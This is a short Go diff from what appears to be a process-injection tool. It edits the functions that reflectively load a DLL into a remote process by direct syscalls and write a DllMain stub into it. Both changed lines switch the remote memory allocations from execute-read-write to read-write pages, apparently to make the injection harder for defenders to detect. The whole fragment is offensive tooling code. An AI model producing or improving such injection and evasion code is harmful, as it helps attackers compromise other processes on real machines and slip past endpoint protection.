@@ -115,7 +115,7 @@ func reflectDLLInjectImpl(dllData []byte, pid int, exportName string, exportArgs
 		}
 	}()
 
-	imageBase, err := syscallNtAllocateVirtualMemory(mgr, hProc, uintptr(sizeOfImage), PAGE_EXECUTE_READWRITE)
+	imageBase, err := syscallNtAllocateVirtualMemory(mgr, hProc, uintptr(sizeOfImage), PAGE_READWRITE)
 	if err != nil {
 		return "", fmt.Errorf("allocate remote memory: %w", err)
 	}
@@ -467,7 +467,7 @@ func writeDllMainStubRemote(mgr *syscallManager, hProc uintptr, imageBase uintpt
 
 	stub = append(stub, 0xC3)
 
-	stubAddr, err := syscallNtAllocateVirtualMemory(mgr, hProc, uintptr(len(stub)), PAGE_EXECUTE_READWRITE)
+	stubAddr, err := syscallNtAllocateVirtualMemory(mgr, hProc, uintptr(len(stub)), PAGE_READWRITE)
 	if err != nil {
 		return 0, fmt.Errorf("alloc stub: %w", err)
 	}
